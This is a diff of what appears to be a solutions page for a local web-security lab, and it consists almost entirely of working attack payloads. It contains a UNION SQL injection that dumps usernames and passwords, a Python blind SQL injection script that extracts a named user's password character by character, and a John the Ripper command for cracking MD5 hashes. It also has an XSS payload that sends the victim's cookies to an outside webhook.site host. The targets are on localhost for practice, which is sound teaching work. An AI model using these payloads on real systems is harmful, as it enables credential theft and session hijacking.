@@ -18,6 +18,38 @@
     <h4>Find credentials</h4>
     <p>AnnoyingWorm' UNION ALL SELECT NULL, Username, NULL, Password FROM SQLi2_Credential-- </p>
 
+
+    <h4>SQLi3</h4>
+
+    <p>
+
+        import requests
+import string
+
+# Place here your values
+url        = 'http://127.0.0.1/progettoSWM/SQLi/SQLi3.php'
+
+# Accumulator 
+out = ''
+
+for i in range(0, 50):
+    for c in string.ascii_lowercase + string.ascii_uppercase + string.digits + '_' + '{' + '}':
+        print(c)
+        injection = f"1' AND BINARY((SELECT SUBSTRING(Password,{i},1) FROM SQLi2_Credential WHERE Username='BigBadGuy')) = BINARY('{c}') -- "
+
+        response = requests.get(url, params= {"ID": injection})
+        if 'We got you covered' in response.text:
+            out += c
+            print(out)
+            break
+
+print(f'Final out data: {out}')
+    </p>
+
+
+    <p>./john --format=raw-md5 --wordlist=/home/triad/Tools/WordLists/john.txt /home/triad/Tools/WordLists/hash.txt
+    </p>
+
     <h3>exercise XXS1</h3>
     <p>http://127.0.0.1/progettoSWM/XSS/XSS1.php?username=%3Cscript%3Edocument.write(%27%3Cimg%20src=%22https://webhook.site/6f06015b-5a9f-4cd1-8e7b-0d338a1a3ec7?username=%27%2bdocument.cookie%2b%27%22%20/%3E%27);%3C/script%3E</p>
 
